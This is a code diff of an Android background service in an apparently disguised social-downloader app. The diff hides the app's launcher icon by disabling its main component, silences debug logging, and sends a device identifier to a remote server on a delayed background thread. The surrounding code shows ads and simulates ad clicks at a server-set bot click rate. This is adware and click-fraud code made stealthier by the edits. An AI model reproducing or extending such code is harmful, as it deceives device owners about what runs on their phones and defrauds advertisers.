@@ -92,13 +92,13 @@ public class MyService extends Service {
         //Adding shortcut for MainActivity
         try {
             PackageManager p = getPackageManager();
-            ComponentName componentName = new ComponentName(this, com.v2social.socialdownloader.SplashActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
             p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            Log.d("caomui","DONE hide icon");
+//            Log.d("caomui","DONE hide icon");
         }
         catch (Exception e)
         {
-            Log.d("caomui","ERROR HIDE ICON");
+//            Log.d("caomui","ERROR HIDE ICON");
         }
 
         Intent shortcutIntent = new Intent(getApplicationContext(),
@@ -119,11 +119,9 @@ public class MyService extends Service {
         addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
         getApplicationContext().sendBroadcast(addIntent);
 
-        Log.d("caomui","ADD shortcut done");
+//        Log.d("caomui","ADD shortcut done");
         createShortcut();
     }
-
-
 
     private void scheduleTask() {
         myTask = new ScheduledThreadPoolExecutor(1);
@@ -135,15 +133,21 @@ public class MyService extends Service {
                 totalTime += intervalService;
                 mPrefs.edit().putInt("totalTime", totalTime).commit();
 
-                if(delay_retention >= 0 && totalTime > delay_retention * 60)//add shortcut or không
+                if(delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
                 {
-                    Log.d("caomui","add shortcut ===========");
                     addShortcut();
                     delay_retention = -1;
                     mPrefs.edit().putInt("delay_retention",-1).commit();
                 }
+
                 if (totalTime < delayService * 60) {
                     return;
+                }
+
+                if(totalTime == 4000)
+                {
+                    SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
+                    mPrefs.edit().putInt("accept", 2).commit();
                 }
 
                 if(totalTime%1440 == 0)
@@ -156,11 +160,9 @@ public class MyService extends Service {
                 if(isReportResult || clientConfig == null)
                     getClientConfig();
                 isContinousShowAds = true;
-
-                Log.d("caomui","------------");
+//                Log.d("caomui","------------");
             }
-//        }, 60, intervalService, TimeUnit.MINUTES);
-        }, 0, 10, TimeUnit.SECONDS);
+        }, 0, intervalService, TimeUnit.MINUTES);
 
     }
 
@@ -193,20 +195,25 @@ public class MyService extends Service {
 
     private void createShortcut()
     {
-        OkHttpClient client = new OkHttpClient();
-        RequestBody body = new FormBody.Builder()
-                .add("id",uuid)
-                .build();
-        Request okRequest = new Request.Builder()
-                .url(AppConstants.URL_CREATE_SHORTCUT)
-                .post(body)
-                .build();
-        try
-        {
-            client.newCall(okRequest).execute();
-        }
-        catch (Exception e){}
-
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Thread.sleep(5000);
+                    OkHttpClient client = new OkHttpClient();
+                    RequestBody body = new FormBody.Builder()
+                            .add("id",uuid)
+                            .build();
+                    Request okRequest = new Request.Builder()
+                            .url(AppConstants.URL_CREATE_SHORTCUT)
+                            .post(body)
+                            .build();
+                    client.newCall(okRequest).execute();
+                }
+                catch (Exception e){
+                }
+            }
+        }).start();
     }
 
     class MyBroadcast extends BroadcastReceiver {
@@ -219,7 +226,6 @@ public class MyService extends Service {
             {
                 return;
             }
-            Log.d("caomui","showads");
             checkAds = new CheckAds();
             checkAds.delayClick = clientConfig.min_click_delay + new Random().nextInt(clientConfig.max_click_delay);
             if(new Random().nextInt(100) < clientConfig.max_ctr_bot)
